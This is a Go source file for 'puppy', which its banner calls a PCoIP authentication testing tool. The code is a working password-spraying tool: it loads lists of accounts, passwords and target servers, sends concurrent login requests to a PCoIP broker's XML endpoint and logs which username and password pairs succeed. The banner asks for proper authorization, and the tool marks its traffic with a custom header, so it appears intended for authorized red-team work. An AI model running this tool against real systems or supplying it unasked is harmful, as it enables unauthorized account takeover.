package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type message struct {
	shutdown bool
	cred     credential
}

type credential struct {
	referenceID  string
	targetServer string
	accountName  string
	password     string
	domain       string
}

func getClient() *http.Client {

	tr := &http.Transport{
		DialTLS: func(network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{}

			conn, err := tls.DialWithDialer(dialer, network, addr, &tls.Config{
				//InsecureSkipVerify: true,
				ServerName: addr,
			})

			if err != nil {
				return conn, err
			}

			//In case cert check is disabled, below code can do some sanity checking for a custom domain
			//quick sanity check in case some cloud IPs change, so we stay in scope
			// found := false
			// for _, cert := range conn.ConnectionState().PeerCertificates {

			// 	if strings.Contains(cert.Issuer.CommonName, certSanityCheck) {
			// 		found = true
			// 		break
			// 	}

			// 	for _, name := range cert.DNSNames {
			// 		if strings.Contains(name, certSanityCheck) {
			// 			found = true
			// 			break
			// 		}
			// 	}
			// }
			// if found == false {
			// 	return conn, errors.New("Certificate sanity check failed - not containnig: " + certSanityCheck)
			// }

			return conn, nil
		},
	}

	return &http.Client{
		Transport: tr,
		Timeout:   time.Second * 8,
	}
}

func getFreshCookies(client *http.Client, server string, referenceID string) {

	log.Printf("RefID: %s Getting fresh cookies.\n", referenceID)
	fmt.Printf("RefID: %s Getting fresh cookies.\n", referenceID)

	var xmlInitiateSession = `
	<?xml version="1.0"?>
		<pcoip-client version="2.1">
			<hello>
				<client-info>
					<product-name>QueryBrokerClient</product-name>
					<product-version>1.0</product-version>
					<platform>PCoIP</platform>
					<locale>en_US</locale>
					<hostname>desktop-test</hostname>
					<serial-number>10:20:30:40:50:60</serial-number>
					<device-name>Test</device-name>
					<pcoip-unique-id>00:00:00:00:00:00</pcoip-unique-id>
				</client-info>
			</hello>
		</pcoip-client>`

	url := "https://" + server + "/pcoip-broker/xml"

	req, err := http.NewRequest("POST", url, strings.NewReader(xmlInitiateSession))
	if err != nil {
		log.Printf("Error occured. RefID: %s. NewRequest (GetFreshCookie): %s ", referenceID, err.Error())
		fmt.Printf("Error occured. RefID: %s. NewRequest (GetFreshCookie): %s ", referenceID, err.Error())
		return
	}

	addHeaders(req)

	var resp *http.Response

	resp, err = client.Do(req)
	if err != nil {
		log.Printf("RefID: %s Error occured. Error: %s\n", referenceID, err.Error())
		fmt.Printf("RefID: %s Error occured. Error: %s\n", referenceID, err.Error())
		return
	}
	defer resp.Body.Close()
	client.CloseIdleConnections()

	if resp.StatusCode != 200 {
		log.Printf("RefID: %s Error occured. StatusCode: %d.\n", referenceID, resp.StatusCode)
		fmt.Printf("RefID: %s Error occured. StatusCode: %d.\n", referenceID, resp.StatusCode)
		return
	}

	//firstCookie := resp.Header.Get("Set-Cookie")
	//log.Printf("   New Cookies RefID: %s. JSESSION: %s\n", referenceID, firstCookie)

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("RefID: %sError occured. Error: %s\n", referenceID, err.Error())
		fmt.Printf("RefID: %sError occured. Error: %s\n", referenceID, err.Error())
		return
	}

	log.Printf("RefID: %s Response Dump: %s", referenceID, string(body))

}

func addHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0)") //yeah, no kidding that't the user agent
	//req.Header.Set("Host", "") // this one doesn't seem to matter much
	req.Header.Set("Accept", "text/*, application/octet-stream")
	req.Header.Set("Content-Type", "text/xml; charset=UTF-8")
	req.Header.Set("Connection", "Keep-Alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("X-Security-Test-Tool", "puppy") //add a custom header to stand out
}

func authenticate(client *http.Client, server string, referenceID string, username string, password string, domain string) {

	var templateXMLAuthenticate = `
	<?xml version="1.0"?>
		<pcoip-client version="2.1">
			<authenticate method="password">
				<username>**USER**</username>
				<password>**PASSWORD**</password>
				<domain>**DOMAIN**</domain>
			</authenticate>
		</pcoip-client>`

	//poor person's replace :)
	templateXMLAuthenticate = strings.Replace(templateXMLAuthenticate, "**USER**", username, -1)
	templateXMLAuthenticate = strings.Replace(templateXMLAuthenticate, "**PASSWORD**", password, -1)
	templateXMLAuthenticate = strings.Replace(templateXMLAuthenticate, "**DOMAIN**", domain, -1)

	url := "https://" + server + "/pcoip-broker/xml"

	req, err := http.NewRequest("POST", url, strings.NewReader(templateXMLAuthenticate))
	if err != nil {
		log.Printf("RefID: %s Error occured. NewRequest Error: %s.\n", referenceID, err.Error())
		log.Printf("RefID: %s Not attempted due to error. %s:%s\n", referenceID, username, password)
		fmt.Printf("RefID: %s Not attempted due to error. %s:%s\n", referenceID, username, password)
		return
	}

	addHeaders(req)

	timestamp := time.Now().Format("2006-01-02 15:04:05")

	var resp *http.Response
	resp, err = client.Do(req)
	if err != nil {
		log.Printf("RefID: %s Error occured. client.Do Error: %s.\n", referenceID, err.Error())
		log.Printf("RefID: %s Not attempted due to error. %s:%s\n", referenceID, username, password)
		fmt.Printf("RefID: %s Not attempted due to error. %s:%s\n", referenceID, username, password)
		return
	}
	defer resp.Body.Close()

	client.CloseIdleConnections()

	if resp.StatusCode != 200 {
		log.Printf("RefID: %s HTTP Error occured. StatusCode: %d.\n", referenceID, resp.StatusCode)
		fmt.Printf("RefID: %s HTTP Error occured. StatusCode: %d.\n", referenceID, resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("RefID: %s Error occured while reading content. Error: %s\n", referenceID, err.Error())
		log.Printf("RefID: %s Investiate manually what happened with this combo.  %s:%s\n", referenceID, username, password)
		fmt.Printf("RefID: %s Investiate manually what happened with this combo.  %s:%s\n", referenceID, username, password)
		return
	}

	b := string(body)
	if strings.Contains(b, "AUTH_FAILED") {
		log.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - FAILED\n", referenceID, timestamp, server, username, password)
		fmt.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - FAILED\n", referenceID, timestamp, server, username, password)
	} else if strings.Contains(b, "AUTH_SUCCESSFUL") {
		log.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - SUCCESS\n", referenceID, timestamp, server, username, password)
		fmt.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - SUCCESS\n", referenceID, timestamp, server, username, password)
	} else {
		log.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - UNKNOWN\n ", referenceID, timestamp, server, username, password)
		fmt.Printf("RefID: %s Authenticate (%s): (%s) %s:%s - UNKNOWN\n ", referenceID, timestamp, server, username, password)
	}

	log.Printf("RefID: %s Debug Dump: (%s) %s:%s Body: %s\n", referenceID, server, username, password, string(body))
}

func initLogging() {
	//create log folder and logfile
	starttime := time.Now()
	os.Mkdir("logs", 0744)
	filename := "./logs/log." + starttime.Format("2006-01-02_15:04:05") + ".log"
	logfile, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
		panic(err)
	}

	//multiwriter := io.MultiWriter(os.Stdout, _logfile)
	log.SetOutput(logfile)

}

const (
	maxWorkers      = 5
	certSanityCheck = "customdomain"
)

func printBanner() {
	fmt.Println("********************************************************")
	fmt.Println("***          PCoIP Auth Testing Tool v.0.1           ***")
	fmt.Println("***      ...still looking for a fancy name...        ***")
	fmt.Println("***             calling it 'puppy' for now           ***")
	fmt.Println("***               @2020 WUNDERWUZZI, LLC             ***")
	fmt.Println("********************************************************")
	fmt.Println("***            https://embracethered.com             ***")
	fmt.Println("********************************************************")
	fmt.Println("    Security testing requires proper authorization.")
	fmt.Println("        Use at own risk and know what you do.")
	fmt.Println("********************************************************")
}

func main() {

	initLogging()
	printBanner()

	//flags
	var domain string
	flag.StringVar(&domain, "domain", "", "Domain of the accounts that are tested")
	flag.Parse()

	if domain == "" {
		fmt.Println("\n\nInvalid arguments.\nUsage: ./puppy -domain example.org\n")
		fmt.Println("Also, three files have to be present in the same directory as puppy, namely:")
		fmt.Println("1) accounts.txt\n2) passwords.txt\n3) servers.txt\n")
		return
	}

	fmt.Println("Loading files...")
	usernames := readFile("accounts.txt")
	passwords := readFile("passwords.txt")
	targetservers := readFile("servers.txt")

	fmt.Printf("Number of usernames: %d\n", len(usernames))
	fmt.Printf("Number of passwords: %d\n", len(passwords))
	fmt.Printf("Number of servers: %d\n", len(targetservers))
	fmt.Printf("Target server: %s\n", targetservers[0])
	fmt.Printf("Concurrency: %d\n", maxWorkers)
	fmt.Printf("Domain for tests: %s\n", domain)
	fmt.Printf("Test logs are in ./logs/\n")
	fmt.Println("***************************************")

	fmt.Print("Press ENTER to start test execution. ")
	bufio.NewReader(os.Stdin).ReadString('\n')

	fmt.Println("Starting...")

	var wg sync.WaitGroup
	workchannel := make(chan message, maxWorkers)
	wg.Add(maxWorkers)

	//create worker pool
	for i := 0; i < maxWorkers; i++ {
		go doStuff(&wg, workchannel)
	}

	//Variant 1)
	//Try the same account/password combos on every server
	// attempt := 0
	// log.Println("Running Variant 1")
	// for indexServer, currentServer := range targetservers {
	// 	for indexPassword, currentPassword := range passwords {

	// 		for indexAccount, currentAccount := range usernames {

	// 			var refID = strconv.Itoa(indexServer) + "-" + strconv.Itoa(indexPassword) + "-" + strconv.Itoa(indexAccount)
	// 			cred := credential{refID, currentServer, currentAccount, currentPassword, domain}
	// 			m := message{false, cred}

	// 			workchannel <- m

	// 			// log.Print("Press ENTER to start test execution. ")
	// 			// bufio.NewReader(os.Stdin).ReadString('\n')
	// 			attempt++
	// 		}
	// 	}
	// }
	//End Variant 1

	///Variant 2)
	//only use the first server in the list for testing
	currentServer := targetservers[0]

	//pick the first password and iterate over all usernames
	attempt := 0
	for indexPassword, currentPassword := range passwords {

		for indexAccount, currentAccount := range usernames {

			var refID = "0-" + strconv.Itoa(indexPassword) + "-" + strconv.Itoa(indexAccount)
			cred := credential{refID, currentServer, currentAccount, currentPassword, domain}
			m := message{false, cred}

			workchannel <- m
			attempt++
		}
	}
	//End Variant 2

	fmt.Println("Approaching end of test space...")

	//send shutdown message to worker routines
	for i := 0; i < maxWorkers; i++ {
		m := message{true, credential{}}
		workchannel <- m
	}

	fmt.Println("Wrapping up.")
	wg.Wait()
	fmt.Printf("Done. Processed %d test cases.\n", attempt)
}

func doStuff(wg *sync.WaitGroup, m <-chan message) {
	defer wg.Done()

	var client *http.Client
	attempt := 0

	work := <-m

	for !work.shutdown {

		//extract creds from message
		cred := work.cred

		//every 5th request we renew cookies and connection
		if attempt%5 == 0 {
			client = getClient()
			client.Jar, _ = cookiejar.New(nil)
			getFreshCookies(client, cred.targetServer, cred.referenceID)
		}

		authenticate(client, cred.targetServer, cred.referenceID, cred.accountName, cred.password, cred.domain)

		//sleep a little to back off
		time.Sleep(40 * time.Millisecond)

		//wait for next message
		work = <-m
	}
}

// read a file line by line and add it to a string array
func readFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
		panic(err)
	}
	defer file.Close()

	lines := []string{}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}
